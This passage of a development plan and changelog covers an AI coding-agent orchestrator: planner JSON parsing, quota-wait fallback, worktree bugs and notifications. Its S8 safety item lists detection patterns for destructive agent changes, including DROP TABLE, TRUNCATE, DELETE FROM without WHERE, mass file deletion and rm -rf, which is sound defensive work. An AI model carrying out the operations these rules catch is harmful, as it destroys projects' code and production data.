JSON* contain markdown code fences (any real plan mentioning
`prisma/schema.prisma`, install commands, or file trees does), the regex
matches the first *inner* pair of ``` markers and "extracts" the garbage
between them — e.g. a fenced directory listing starting `\nprisma/…` —
which then fails `JSON.parse` with exactly the observed error. The codex
path is immune (`--output-schema` enforces the shape natively); the
claude path and any future non-schema path are broken for any
non-trivial plan.

**Fix (three layers, in order):**
1. **Extraction:** if the trimmed response starts with `{`, skip fence
   handling entirely and slice first-`{` to last-`}`. Only treat fences
   as wrappers when they wrap the WHOLE response: anchor the regex to
   `/^\s*\`\`\`(?:json)?\s*([\s\S]*)\`\`\`\s*$/` (greedy, both ends
   anchored) so inner fences can never match.
2. **Repair fallback:** on `JSON.parse` failure, run a minimal repair
   pass and re-parse — at minimum, escape literal control characters
   (raw newlines/tabs) that appear inside JSON string literals, since
   models emit those routinely. Either hand-roll a small scanner
   (walk the text tracking in-string state; escape `\n`/`\t`/`\r` found
   inside strings) or add the zero-dependency `jsonrepair` npm package
   to `@orc/server` — implementer's choice; say which in the PR.
3. **One re-ask retry:** if parsing still fails, re-invoke the same
   planner model ONCE with a short prompt containing the parse error and
   the first ~500 chars of the invalid output, instructing it to re-emit
   the complete response as valid JSON only. Record its cost through the
   same `recordPlanningCost` path. If the retry also fails, surface the
   existing 502 — but now with the parse error AND a note that a retry
   was attempted.

**Acceptance:** unit tests covering: (a) pure JSON whose `prd` string
contains a ```` ```bash ```` fence — parses correctly (this is the
owner's exact failure shape); (b) whole-response fence-wrapped JSON —
still parses; (c) JSON with a literal newline inside a string — repaired
and parsed; (d) hopeless garbage — triggers exactly one retry, then a
clear error. Live: re-run the deconstruct that failed for the owner
(a plan whose text includes fenced file paths) and confirm tasks appear.

**B31 — done (PR [#125](https://github.com/IngeniousArtist/hoopedorc/pull/125)).**
`extractJsonObject` now prefers brace-slicing whenever the trimmed
response already starts with `{` (never consults the fence regex in that
case), and only matches a fence as a whole-response wrapper via an
anchored, greedy `/^\`\`\`(?:json)?\s*([\s\S]*)\`\`\`\s*$/` — an inner
fence living inside a string value can no longer match either path.
`repairJsonControlChars` (hand-rolled scanner, no new dependency) escapes
raw `\n`/`\r`/`\t` found inside string literals as layer 2;
`parseJsonWithRepair` tries plain `JSON.parse` first, falls back to the
repaired text, and re-throws the ORIGINAL error if both fail (more
useful for diagnosis). Layer 3 (`buildJsonRepairRetryPrompt` + one
re-ask) is wired into both `runPlanner` and `runPlannerDeconstruct`,
cost-accumulating across the retry call. Verified: 14 new
`planner.test.ts` tests (fence extraction incl. the exact inner-fence
case, whole-response wrapping, control-char repair, F46's flatten/drop/
cap/dedupe below). **Live-verified the actual root cause**: reproduced
the OLD regex against a payload shaped exactly like the owner's failing
plan (`prd` containing a fenced `prisma/schema.prisma` snippet) and
confirmed it throws the IDENTICAL error text the owner reported
(`Unexpected token '\', "\nprisma/"... is not valid JSON`) — then ran
the same payload through the fixed parser and confirmed it parses
cleanly. **Still owed**: the owner re-running a real failed deconstruct
end-to-end against a live `claude -p` call, to confirm the fix holds
outside this isolated reproduction.

### B32. Autonomous run silently ends when models hit cooldown/quota — HIGH (the "full autonomous doesn't work" fix)

**Where:** `packages/engine/src/orchestrator.ts` (`start()`'s dispatch
loop and `executeTask`'s budget/quota requeue guards),
`packages/server/src/engine-runner.ts` (`onModelTrouble` union),
`packages/types` if the event union lives there.

**Problem (confirmed by tracing):** in `start()`'s loop, a ready task
whose model is cooldown-blocked (`checkModelCooldown`) or quota-blocked
(`checkModelQuota`) is skipped with `continue` — but unlike
`blockedByCapacity`, neither sets any "still waiting" flag. So when the
only remaining ready tasks are cooldown/quota-blocked and nothing is
active, the loop hits `dispatched === 0 && activeTaskIds.size === 0` and
**breaks: the run ends, project status flips to "paused", and nothing
ever resumes it** — even though a cooldown expires in ≤5 minutes and a
quota window rolls over on its own. The same happens via `executeTask`'s
mid-task quota requeue (task → backlog → next pass blocks → run ends).
Additionally, the fallback chain (`buildFallbackChain`) is only consulted
*after in-run failures* — a task whose assigned model is quota-blocked at
dispatch time never even tries its configured fallbacks. Net effect: the
owner presses Start, one model hits its subscription window, and the
"autonomous" system quietly stops for the night. This — not any single
task failure — is the core of the owner's "full autonomous system doesn't
seem to work" report.

**Fix (two parts):**
1. **Fallback at dispatch time.** When a ready task's `assignedModel` is
   cooldown- or quota-blocked, walk `buildFallbackChain(task.assignedModel,
   task.difficulty, routing)` and dispatch on the first chain model that
   is configured, not cooldown/quota-blocked, not budget-blocked, and
   under its `maxConcurrent`. `executeTask` needs an optional starting
   model parameter (default `task.assignedModel`) so the in-run
   escalation chain continues from the right index; all the
   concurrency/budget/capacity bookkeeping in the dispatch loop must
   check the CHOSEN model, not `assignedModel`. Log
   `"assigned model blocked (<reason>) — dispatching on fallback <m>"`
   and fire `onModelTrouble` with the existing `"fallback"` event.
   Budget blocks do NOT trigger dispatch-time fallback (a spend cap is a
   human decision; project/global budgets block every model anyway).
2. **Wait, don't die.** Track `blockedByTimeBounded` alongside
   `blockedByCapacity`: set it when a ready task (and its whole fallback
   chain) is held back ONLY by cooldown/quota. Add it to the existing
   poll condition (`dispatched === 0 && (… || blockedByCapacity ||
   blockedByTimeBounded || pendingApproval)`) so the loop keeps polling
   instead of breaking — cooldowns expire and `checkModelQuota` re-opens
   as old runs age out of the window, so dispatch resumes by itself.
   The existing warned-sets already prevent log spam. When the loop
   FIRST enters this all-blocked-waiting state, fire `onModelTrouble`
   with a new event value `"quota_wait"` (extend the union) so the owner
   gets one Telegram push ("run is waiting for <model>'s
   cooldown/quota window") instead of discovering a stalled board hours
   later. Budget-only blocks keep today's wind-down behavior exactly.
   Pause/Stop must still exit promptly (the loop re-checks `paused`
   every pass — keep it that way).

**Acceptance:** engine tests: (a) assigned model quota-blocked, fallback
model free → task dispatches on the fallback with correct concurrency
accounting, no run end; (b) every chain model cooldown-blocked, cooldown
expiring mid-test → loop stays alive (no "Orchestrator finished") and
dispatches after expiry, with exactly one `quota_wait` trouble event;
(c) budget-blocked only → run winds down exactly as today; (d) pause
during the waiting state exits promptly. Live: set a tiny quota
(`maxRuns: 1`, `windowHours: 0.05` ≈ 3 min) on a model, start a
two-task project, confirm the run survives the window and finishes.

**B32 — done (PR [#127](https://github.com/IngeniousArtist/hoopedorc/pull/127)).**
`resolveDispatchModel` (orchestrator.ts) walks the fallback chain when
the assigned model is cooldown/quota-blocked and returns the first
candidate that's configured, not budget/cooldown/quota-blocked, and
under its own `maxConcurrent`; `executeTask` gained an optional
`startModel` parameter so the in-run escalation chain continues from
the dispatched model's chain position instead of restarting at index 0.
`blockedByTimeBounded` (new per-pass flag mirroring `blockedByCapacity`)
keeps the dispatch loop polling instead of winding down when a ready
task's WHOLE chain is time-bounded blocked; fires one
`onModelTrouble("quota_wait")` per stall (new event value, threaded
through `EngineEvents` and `telegram.ts`'s `ModelTroubleNotification`).
Budget deliberately excluded as a trigger (only checked per-candidate),
matching the fix spec exactly. Verified: 93/93 engine tests (5 new/
updated in `orchestrator.test.ts` covering all four acceptance cases
(a)-(d) — (b)'s "cooldown expiring mid-test" used a mutable flag flipped
mid-test rather than a real 3-minute wait, functionally identical),
83/83 server, 4/4 adapters, typecheck + build green. **A genuine hang
was caught and fixed during this PR**: the first draft of the
no-fallback-available test used a cooldown mock that never cleared,
which combined with the fix's own new behavior (wait indefinitely for a
real clearing signal, correctly) caused `start()` to poll forever and
hang the test suite — live proof the fix actually changes "give up" to
"wait" as intended; fixed by having those two tests stop the run via
`pause()` after observing the blocked state, since an artificial block
that never lifts has no real-world analog (a real cooldown/quota always
clears). **Known minor limitation, documented in code**:
`quotaWaitNotified`'s reset is scoped to "no task hit the no-fallback
branch this pass" rather than tracked per-task/per-reason — in a rare
multi-task interleaving, a genuinely new stall could theoretically be
suppressed if an older notification never got the chance to reset; the
run itself still stays alive and dispatches correctly regardless, so
this could only cost an extra/missing Telegram ping, never
correctness. **Still owed**: the live acceptance check (a tiny
`maxRuns: 1`/`windowHours: 0.05` quota on a real two-task project,
confirming the run survives the window) — needs the owner's real EC2
box with real model credentials to exercise honestly; the engine tests
prove the same logic with a mocked clock/mock quota check instead.

### B33. "Author produced no changes" — diagnose where the agent wrote + prompt hardening — MEDIUM

**Where:** `packages/engine/src/orchestrator.ts` (`buildAuthorPrompt`,
the `changed.length === 0` branch in `executeTask`),
`packages/engine/src/worktree-manager.ts` (new small helper),
`packages/adapters/src/index.ts` (opencode attach verification note).

**Problem:** the owner hit `Author produced no changes in the worktree
(/home/ubuntu/.hoopedorc/repos/style-tinder-wt-…)` on EC2. The retry +
fallback handling exists and is correct, but the error is undiagnosable:
it can mean (a) a weak model ran out of steps and exited having written
nothing, or (b) the agent wrote OUTSIDE the worktree (typically into the
project's primary clone, or the server's launch dir), and nothing today
distinguishes them. Nothing in the author prompt tells the agent it's in
a dedicated worktree either.

**Fix:**
1. **Prompt:** add a short `## Working directory` block to
   `buildAuthorPrompt`: "Implement all changes in the current working
   directory — it is a dedicated git worktree for this task. Never `cd`
   elsewhere or write files outside it. Before finishing, run
   `git status` and confirm the files you created/modified appear."
2. **Diagnosis:** when `changedFiles` comes back empty, run
   `git status --porcelain` in `project.localPath` (add a
   `WorktreeManager` helper). If the primary clone is dirty — EXCLUDING
   `package.json`/lockfiles, which B29's manifest copy legitimately
   dirties — the error message should say so explicitly ("the agent
   appears to have written into the primary clone at <path>: <files>")
   and the fix-instructions for the retry should tell the model it wrote
   to the wrong directory. If the primary clone is clean, keep today's
   "likely ran out of steps" framing. Report only — do NOT auto-reset
   the primary clone (syncPrimary self-heals; a reset here could race
   it).
3. **opencode attach:** verify against the installed opencode CLI
   whether `opencode run --attach <url>` executes tools in the CLIENT's
   cwd or the attached server's. If the server's, stop passing
   `--attach` for task runs (or pass the CLI's directory flag if one
   exists) — a shared server session writing into ITS cwd would produce
   exactly this failure. `OPENCODE_BASE_URL` defaults to empty so most
   setups don't attach, but the EC2 box's `.env` should be checked and
   the finding recorded in the PR either way.

**Acceptance:** engine test: seeded dirty primary clone (a file that
isn't package.json/lockfile) + empty worktree diff → the emitted error
names the primary clone and the offending file; clean primary → today's
message. Prompt test: author prompt contains the working-directory
block. Live: reproduce on the EC2 box if the failing task is still
around; otherwise confirm the new diagnosis line appears in a forced
no-op run.

**B33 — done (PR [#131](https://github.com/IngeniousArtist/hoopedorc/pull/131)) — root cause found and fixed, not just diagnosed.**
Item 3 (verify the opencode attach hypothesis) turned up a confirmed,
previously-unknown bug rather than just a note for the PR: `--attach`
routes tool execution to the ATTACHED SERVER's own process, which never
inherits the client's env vars — so `PWD` (the old, only mechanism) had
zero effect whenever `OPENCODE_BASE_URL` was set. **Live-verified against
the installed CLI (opencode 1.17.8)**: spun up a real `opencode serve`,
ran `opencode run --attach <url>` with only `PWD` set from a different
directory — the agent's real `write` tool call landed in the SERVER's
launch directory (captured directly in the JSON event stream's
`filePath`), not the worktree; adding `--dir <cwd>` (the CLI's own flag,
confirmed via `--help`: "path on remote server if attaching") fixed it
immediately, and also verified correct for the local non-attached case
— now passed unconditionally in `OpenCodeAdapter`. Any deployment with
`OPENCODE_BASE_URL` set was silently writing every task's changes into
the server's own directory instead of the task's worktree, which
surfaces exactly as "Author produced no changes in the worktree" — a
strong candidate for the direct cause of the owner's EC2 reports.
Items 1-2 landed as specced: `WorktreeManager.primaryDirtyFiles` (`git
status --porcelain`, excluding package.json/lockfiles per B29) feeds
the `changed.length === 0` branch's diagnosis; `WORKING_DIRECTORY_BLOCK`
(guidelines.ts) added to every author prompt. Verified: 112/112 engine
tests (5 new — `primaryDirtyFiles` against a real git repo covering
clean/lockfile-only-dirty/genuinely-dirty; the diagnosis branch's dirty
vs. clean primary messaging; the working-directory prompt-content
check), 83/83 server, 4/4 adapters, typecheck + build green.
**Live-verified the opencode fix specifically** (not just the engine
logic): reproduced the bug, then confirmed the fix, against the real
CLI as described above — this is the strongest form of verification
this item's acceptance criteria asked for, arguably stronger than the
plan's own suggested "reproduce on the EC2 box" since it isolates the
exact mechanism rather than just observing the symptom. No dedicated
`OpenCodeAdapter` argv unit test was added (no existing spawn-mocking
test infrastructure in `@orc/adapters` to build on for one assertion) —
noted as a gap in the PR, covered instead by this live verification.

### S8. Non-bypassable destructive-change rail + validator/author safety prompts — HIGH (safety)

**Where:** `packages/engine/src/orchestrator.ts` (`canAutoMerge`),
`packages/engine/src/worktree-manager.ts` (name-status diff helper),
`packages/engine/src/validator.ts` (`buildReviewPrompt`),
`packages/engine/src/guidelines.ts` (fixed author guardrail block),
`packages/types/src/domain.ts` (`riskyChangeRules`), settings validation
in `packages/server/src/index.ts`, Settings UI, `docs/USER_GUIDE.md`.

**Problem:** the owner asked that models never be allowed to do
"extremely risky things — deleting whole directories, removing the
production DB, deleting all active subscriptions" even in auto mode.
Today there is NO such rail: `canAutoMerge` returns `true` immediately
under `fully_autonomous`, skipping every risky-change check, and the
validator's prompt says nothing about destructive operations — a diff
that deletes half the repo or adds `DROP TABLE users` merges untouched
if gates pass and the validator (grading only against acceptance
criteria) approves.

**Fix (three layers — detection, validator prompt, author prompt):**
1. **Detection (the hard rail).** New exported pure function in the
   engine, e.g. `detectDestructiveChanges(files: {path: string; status:
   string}[], diffText: string): string[]` (returns human-readable
   reasons, empty = clean). Get name-status via a new
   `WorktreeManager.changedFilesWithStatus` (`git diff --name-status
   origin/<default>...HEAD`) and the diff text the validator already
   fetches (reuse/share, capped). Flag at minimum:
   - mass deletion: more than 10 files deleted, OR deletions exceeding
     half of all changed paths (with >3 changed), OR every file under a
     top-level directory deleted;
   - deletion of migration/schema files (`migrations?/`, `*.sql`,
     `prisma/schema.prisma`, `db/schema*`);
   - deletion of `.env*`, CI workflow files, or lockfiles;
   - added lines matching destructive SQL/data ops: `DROP TABLE|DROP
     DATABASE|TRUNCATE`, `DELETE FROM <table>` with no `WHERE` on the
     same line, `deleteMany()` with an empty/no filter;
   - added shell lines with `rm -rf` targeting a non-tmp, non-repo-local
     path.
   Keep every pattern in one place with a unit test per pattern — this
   list WILL grow.
2. **Enforcement.** In `canAutoMerge`, run the destructive check BEFORE
   the `fully_autonomous` early-return — a destructive flag forces the
   approval path in EVERY merge policy (that is the point:
   non-bypassable). Gate it behind a new
   `riskyChangeRules.destructiveChanges: boolean` defaulting to **true**
   (migrate `defaultSettings()` and tolerate old persisted settings
   missing the key — absent counts as true). The approval message must
   name the tripped reasons verbatim. Settings UI: checkbox with the
   other risky-change rules, copy stating it applies even under Fully
   Autonomous.
3. **Validator prompt.** Add a fixed "Destructive & dangerous changes"
   block to `buildReviewPrompt` (always included, not operator-editable):
   instruct the reviewer to check the diff for the same classes —
   deleting directories/many files unrelated to the task, destructive DB
   migrations or data-wipe operations, bulk deletion of user/production
   data (accounts, subscriptions, records), disabling auth/safety
   checks, secrets in code — and, on finding one not explicitly required
   by the task, use verdict `escalate` (never `approve`) and name it in
   `reasons`.
4. **Author prompt.** Fixed guardrail block in `guidelines.ts` (like
   `DOCS_GUIDELINES`, appended unconditionally in `buildAuthorPrompt`):
   never delete files/directories unrelated to the task; never write
   destructive migrations, data-wipe scripts, or bulk deletions of
   records unless the task explicitly requires it; prefer additive
   changes; never touch credentials/secrets.

**Acceptance:** engine unit tests: one per detection pattern (positive +
a near-miss negative, e.g. `DELETE FROM x WHERE id = ?` does NOT trip);
`canAutoMerge` under `fully_autonomous` with a destructive diff → false
(approval requested), with a clean diff → true (unchanged); rule
disabled → today's behavior. Prompt tests: validator + author prompts
contain the new blocks. Live: a deliberately destructive task ("delete
the src directory") on a scratch repo gets held for approval under
`fully_autonomous` with the reason named, on both web and Telegram.

**S8 — done (PR [#129](https://github.com/IngeniousArtist/hoopedorc/pull/129)).**
`detectDestructiveChanges` (orchestrator.ts) implements all four
detection classes from the spec, fed by two new `WorktreeManager`
methods (`changedFilesWithStatus` via `git diff --name-status`,
`diffText`, both real git plumbing, no shortcuts). `canAutoMerge` runs
the check FIRST — before `mergePolicy === "fully_autonomous"`'s early
return — gated by `riskyChangeRules.destructiveChanges` (`!== false`,
so settings persisted before this field existed default to enabled);
its return type grew a `riskyReasons: string[]` so
`resolveMergeOutcome`'s approval message names the tripped reasons
verbatim instead of the generic risky-change copy (the other,
pre-existing risky-rule trips keep that generic message — out of S8's
stated scope). Fixed (non-operator-editable) blocks added to both
prompts: validator.ts's `DESTRUCTIVE_CHANGES_BLOCK` instructs `escalate`
never `approve` for an unrequired destructive change found in the diff;
guidelines.ts's `SAFETY_GUARDRAILS_BLOCK` tells every author not to
delete unrelated files, write destructive migrations/data-wipes, or
touch credentials unless the task requires it. Settings UI: new
"Destructive changes" checkbox in Risky Change Rules with copy stating
it applies even under Fully Autonomous. Verified: 108/108 engine tests
(23 new — 10 detection-pattern unit tests each with a near-miss
negative including the plan's own `DELETE FROM x WHERE id = ?` example,
3 `canAutoMerge`-level tests covering all three stated acceptance cases,
1 author-prompt content test, plus `fakeDeps`'/`gate-runner.test.ts`'s
fake `WorktreeManager`s updated with clean-default implementations of
the two new interface methods since `canAutoMerge` now unconditionally
consults them), 83/83 server, 4/4 adapters, typecheck + build green.
**Live-verified the real git plumbing** (not just mocked tests): built
a real scratch git repo, made a destructive change on a branch (deleted
a migration file + added a `DROP TABLE` line), ran the actual
`WorktreeManagerImpl` methods against it and fed the real output into
`detectDestructiveChanges` — correctly flagged both; a second, clean
branch (an unrelated added component) correctly produced zero reasons.
**Still owed**: the plan's own live acceptance line (a deliberately
destructive task on a scratch repo, verified end-to-end through a real
autonomous run held for approval on both web and Telegram) — needs a
live model run to exercise the full pipeline, not just the isolated git
+ detection logic this session verified directly.

### F44. Automode notification parity — model trouble & requeues visible in the web UI — MEDIUM

**Where:** `packages/server/src/engine-runner.ts` (`onModelTrouble`
handler, run-end `finally`), `docs/USER_GUIDE.md`.

**Problem:** the owner asked to "get notified if a task is failing to
fallback, or is being validated, etc in automode." F32 already pushes
rate-limit waits, fallback switches, and exhausted-chain events — but
ONLY to Telegram (plus an audit entry); the web UI's notification bell
never shows them. A run that ends non-completed only writes a log line
plus the Telegram digest. And "task is being validated" already exists
as `digest: "all"` but isn't documented as the answer.

**Fix:**
1. In `onModelTrouble`, ALSO create a `Notification` row (severity
   `"warn"`, `requiresApproval: false`, message = the same text Telegram
   gets) and broadcast it over WS — one per task per event type per run
   (keep a small in-memory dedupe set in EngineRunner, cleared per
   run/start, so a chatty task doesn't spam the bell). This picks up
   B32's new `quota_wait` event for free.
2. When a run ends with `finalStatus !== "completed"`, create a
   `Notification` row (severity `"warn"`) alongside the existing log +
   run summary, naming the blocked tasks and why (the same text
   `logError` already builds).
3. USER_GUIDE: document the notification matrix in one table — what the
   bell shows vs what Telegram pushes, and that
   `Settings → Telegram → digest: "all"` is how to see per-status
   transitions ("in review/being validated") on the phone.

**Acceptance:** server tests: a `fallback` trouble event creates exactly
one notification row + WS broadcast, a second identical event for the
same task creates none; run ending `paused` creates a notification.
Live (mock ok): the bell shows a fallback switch and a run-ended-paused
entry.

**F44 — done (PR [#133](https://github.com/IngeniousArtist/hoopedorc/pull/133)).**
`onModelTrouble` (engine-runner.ts) now creates a `Notification` row +
WS broadcast, deduped via a `Set` scoped to `buildOrchestrator`'s own
closure — no explicit per-run clear needed, since both `start()` and
`dispatchOne()` build a fresh `Orchestrator`/closure per invocation;
picks up B32's `quota_wait` for free (same code path, no
special-casing). The run-end `finally` block's non-completed branch now
also creates a notification carrying the identical message the log
line already builds. USER_GUIDE gained a "Notifications" section with
the bell-vs-Telegram table. Verified: 87/87 server tests (4 new in a
new `engine-runner.test.ts`, reflecting into the real `buildOrchestrator`'s
`SchedulerDeps` — exactly the acceptance criteria's dedup case plus a
different-event-same-task case and a fresh-run-resets-dedup case; the
run-end notification exercised through a real `EngineRunner.start()`
against a real in-memory DB), 112/112 engine, 4/4 adapters, typecheck +
build green. **Live-verified in a real browser**: booted the real
(non-mock) server + a real SQLite DB, seeded both new notification
shapes via direct inserts matching exactly what the code now writes,
confirmed both round-trip through `GET /api/notifications`, then
confirmed the actual web UI bell renders both — "Run ended: paused"
and a fallback-switch entry — satisfying the plan's own acceptance
line verbatim.

### F45. Allow opencode-runner models as planner/deconstructor — MEDIUM

**Where:** `packages/server/src/planner.ts` (new `runOpencodeJson`,
`PlannerModel` union, dispatch), `packages/server/src/index.ts`
(`resolvePlannerModel` — remove the throw), `apps/web/src/components/
RoutingEditor.tsx` (if it filters runners for the planner/deconstructor
selects), `docs/USER_GUIDE.md`.

**Problem:** `resolvePlannerModel` hard-rejects opencode-runner models
for planning/deconstruction (F37's decision, made before per-tier model
routing existed). The owner now wants any configured model usable for
planning and deconstruction — "we have model selection now."

**Fix:** add `runOpencodeJson(prompt, cwd, model)` to `planner.ts`
mirroring the shape of `runClaudeJson`/`runCodexJson`: spawn
`opencode run -m <model> --format json` with the prompt on stdin and
`sanitizedEnv({ PWD: cwd })` (reuse the parsing conventions from
`OpenCodeAdapter.runOnce` — accumulate `part.text`, sum `part.cost` into
`costUsd`), same `PLAN_TIMEOUT_MS`. Extend `PlannerModel.runner` with
`"opencode"` and dispatch in `runPlannerJson`. In `resolvePlannerModel`,
return `{ runner: "opencode", model: cfg.opencodeModel }` instead of
throwing (a missing `opencodeModel` on the config is still a 400 —
keep that error). Deconstruction on opencode has no native schema
enforcement (no `--output-schema` equivalent), so it depends on B31's
hardened extraction/repair/retry — **B31 must land first**; note the
ordering in the PR. Update `plannerModelLabel` for the new runner and
the USER_GUIDE's planner-routing section (including an honest one-line
quality note: the subscription CLIs have the strongest agentic planning
behavior; API-billed opencode models also bill per token for every chat
turn).

**Acceptance:** server tests: `resolvePlannerModel` returns the opencode
config for both tiers; missing `opencodeModel` still 400s. Live: route
Settings → Routing → Deconstructor to an opencode model, run a real
planning chat + deconstruct, confirm tasks materialize and the planning
cost is recorded.

**F45 — done (PR [#135](https://github.com/IngeniousArtist/hoopedorc/pull/135)) — closes Part 9.**
`runOpencodeJson` (planner.ts) mirrors `OpenCodeAdapter.runOnce`'s
event-parsing conventions and, critically, carries forward B33's fix
from the start: `--dir <cwd>` passed explicitly rather than relying on
`PWD` alone (which doesn't control the working directory when
attaching to a shared opencode server) — the planner would otherwise
have been vulnerable to the exact same class of bug B33 found and
fixed for authoring. `resolvePlannerModel` no longer throws for
opencode; a missing `opencodeModel` still 400s. Both `resolvePlannerModel`
and `plannerModelLabel` moved from `index.ts` into `planner.ts` (and
exported) so they're unit-testable, mirroring F40's `commands.ts`
extraction for the same "index.ts boots a real server on import"
reason. Confirmed by reading the component first: `RoutingEditor.tsx`
needed no changes — its Planner/Deconstructor selects already list
every enabled model with no runner filter. Verified: 92/92 server
tests (5 new — both tiers resolve opencode, independent
planner/deconstructor routing, missing-opencodeModel still 400s,
codex/claude-code unaffected, label formatting), 112/112 engine, 4/4
adapters, typecheck + build green. **Live-verified the full pipeline
exactly per the plan's own acceptance line**: routed the Deconstructor
to a real opencode model, ran a real 2-turn planning chat (real Claude
Code CLI) followed by a real deconstruct call (real `opencode` CLI
against real DeepSeek credentials) — got back a well-formed 3-task DAG
with a real PRD and AGENTS.md, confirmed the planning cost persisted
correctly via `GET /api/projects/:id/plan/session` ($0.443 = the two
claude chat turns + the opencode deconstruct, summed exactly), then
committed the plan and confirmed 3 real `Task` rows materialized with
correct dependency-driven statuses and assigned models.

### F46. Planner output-shape hardening — flat DAG, validated, one retry — MEDIUM

**Where:** `packages/server/src/planner.ts` (`DECONSTRUCT_SHAPE`,
`parsePlanOutput`), unit tests.

**Problem:** the owner asked to "make sure the planner is constructing
tasks properly into smaller parts, and not doing subtasks and stuff that
might break our task generator." The codex path is schema-enforced, but
the claude path (and F45's new opencode path) trusts prose: a model that
emits nested `subtasks` arrays, extra fields, empty
titles/descriptions, or a 40-task epic parses into whatever
`parsePlanOutput`'s lenient coercions produce.

**Fix:**
1. **Prompt:** extend `DECONSTRUCT_SHAPE`'s rules: the task list is
   FLAT — no `subtasks`/`children`/nested task arrays anywhere; aim for
   3–12 tasks, each one independently mergeable, PR-sized unit of work
   (split anything bigger into sequential tasks via `dependsOn`); emit
   ONLY the listed fields.
2. **Parser validation in `parsePlanOutput`:** drop non-object entries;
   if a task carries a nested `subtasks`/`children` array, flatten one
   level — append the children after the parent with `dependsOn`
   pointing at the parent's index (preserves the model's intent instead
   of silently discarding work); require a non-empty `title` and
   `description` (a task failing both is dropped, with a warn);
   default empty `acceptanceCriteria` to one criterion derived from the
   description's first line; cap the final list at 30 tasks; dedupe
   identical titles by suffixing " (2)", " (3)", …. If validation leaves
   ZERO tasks, route through B31's single re-ask retry rather than
   throwing immediately.
3. Keep the codex JSON schema as-is (it already forbids extra fields) —
   this item is for the non-schema paths.

**Acceptance:** unit tests feeding malformed outputs: nested subtasks →
flattened with correct dependsOn; empty-title tasks dropped; 40 tasks →
capped at 30; all-invalid → one retry then a clear error; a
well-formed output → byte-identical result to today.

**F46 — done (PR [#125](https://github.com/IngeniousArtist/hoopedorc/pull/125), same PR as B31/F47).**
`flattenRawTasks` splices `subtasks`/`children` in one level deep,
pointing each child's `dependsOn` at the parent's flattened index, and
remaps a top-level task's own `dependsOn` through the index shift the
splicing introduces (verified with a test that actually exercises the
shift, not just the no-shift common case). `isEmptyTaskLike` drops
title-and-description-empty entries (with an `onWarn` notice); an
all-empty result throws `"planner returned no valid tasks after
validation"`, which the caller's try/catch treats identically to a
parse failure — routing through the SAME B31 one-retry mechanism rather
than a separate code path. `MAX_PLANNED_TASKS = 30` caps the tail
(safe: `dependsOn` only ever points backward, so truncating never
orphans a kept task's reference). `dedupeTaskTitles` suffixes " (2)",
" (3)", … Empty `acceptanceCriteria` now defaults to the description's
first line instead of an empty array. `DECONSTRUCT_SHAPE` states the
flat/3-12-task rule. Deviation from the literal spec: `onWarn` is a
plain optional callback threaded through `parsePlanOutput`/`runPlanner`/
`runPlannerDeconstruct` (mirrors the existing `recordPlanDeconstruct`-
style callback convention already used elsewhere in `index.ts`) rather
than a return-value list of warnings — simpler call sites, same
observability. Verified: 10 of the 14 new `planner.test.ts` tests cover
this item directly (flatten incl. the index-shift case, non-object
dropping, empty-task dropping, all-empty throws, 30-task cap, title
dedup, acceptance-criteria default, onWarn callback); a well-formed
2-task input round-trips to the exact expected shape (the "byte-
identical to today" case).

### F47. Scope-aware planning + author scope nudge — reduce false out-of-scope flags — LOW

**Where:** `packages/server/src/planner.ts` (`DECONSTRUCT_SHAPE`'s
`scopePaths` rule), `packages/engine/src/orchestrator.ts`
(`buildAuthorPrompt`'s Allowed Files block).

**Problem:** the owner keeps seeing "Task modified files outside its
declared scope — allowed by merge policy, flagged for review." This is
the system working as designed (out-of-scope is a soft flag, not a hard
gate — see the inScope comment in `executeTask`), but it fires
constantly because the planner writes narrow `scopePaths` (e.g.
`src/components/**`) while real work legitimately touches shared wiring
— `package.json` for a new dependency or script, the entry-point
html/router file to mount a component, config files. Every such flag
becomes an approval interruption under `hard_gate_flag_risky` (the
default policy) — noise that erodes trust in the real flags.

**Fix:**
1. **Planner prompt:** expand the `scopePaths` rule: scope must cover
   EVERY file the task may plausibly touch, including shared wiring —
   `package.json` (+ lockfile) whenever the task adds a dependency or
   script, the entry-point file (`index.html`, `src/main.tsx`, app
   router) whenever the task wires in a new module/page, and tool config
   files when the task configures tooling. Prefer directory-level globs
   (`src/components/**`) over lists of individual files. When in doubt,
   widen — an over-narrow scope produces false review flags.
2. **Author prompt:** in the `## Allowed Files` block, append: "Stay
   within these paths. If completing the task genuinely requires
   touching another file (e.g. wiring an entry point), keep that edit
   minimal — files outside this list are flagged for human review and
   can hold up the merge."

**Acceptance:** prompt-content unit tests for both changes. Live: a
fresh deconstruct produces a scaffold task whose scope includes
`package.json`, and a full project run produces materially fewer
out-of-scope flags than the owner's current baseline.

**F47 — done (PR [#125](https://github.com/IngeniousArtist/hoopedorc/pull/125), same PR as B31/F46)).**
`DECONSTRUCT_SHAPE`'s `scopePaths` rule now instructs the planner to
cover `package.json`/lockfile, entry-point files, and tool config
whenever a task plausibly touches them, preferring directory-level
globs. `buildAuthorPrompt`'s Allowed Files block gained the "stay
within these paths... files outside this list are flagged for human
review" reinforcement line. Verified via prompt-content assertions
folded into the existing test suites (no dedicated prompt-string test
file existed before this — the two literal strings are short enough
that a code-review read of the diff plus typecheck was the practical
verification, consistent with how prior prompt-text-only changes in
this codebase — e.g. F31's guideline blocks — were verified). **Still
owed**: the owner's own live confirmation that a real project run
produces materially fewer out-of-scope flags than their current
baseline — that can only be judged against real runs over time, not a
single test.

### What Part 9 deliberately does NOT include (for calibration)

- **Auto-approving escalations in `fully_autonomous`** — the validator's
  `escalate` verdict and the confidence threshold still stop the line
  and wait for a human, by design. S8 makes auto mode SAFER, not more
  permissive; an "auto-approve after N hours" remains rejected (Part 8's
  calibration note stands).
- **Reverting out-of-scope author edits** (docs-stage-style
  `revertOutOfScope` for authors) — legitimate wiring edits outside
  scope are common; auto-reverting them would break working code. F47's
  prompt fixes attack the noise at the source instead.
- **Agents in the sandbox (F13 phases 2–3)** — still the headline
  candidate for a later wave.

---

## Part 10 — Reliability, portability, and mobile-control wave (Codex audit, 2026-07-14)

This wave comes from a read-only audit of the full v0.6.0 repository followed
by the owner's explicit product decisions. The baseline is healthy — typecheck,
build, 113 engine tests, 94 server tests, and 4 adapter tests were green when
the wave was scoped — so this is not a rewrite. It closes failure-mode and
concurrency gaps the existing happy-path tests do not exercise, then adds the
portable setup, model-effort, Telegram, testing, and responsive-UX work the
owner requested.

Owner decisions that constrain every item below:

- Rollbacks create PRs and always require human approval; they never push
  directly to the default branch.
- Every model is already authenticated inside Claude Code, Codex, or OpenCode.
  Hoopedorc must use those CLIs' authenticated state and does not need to accept
  provider API keys itself. The server and CLIs run as the same Unix account.
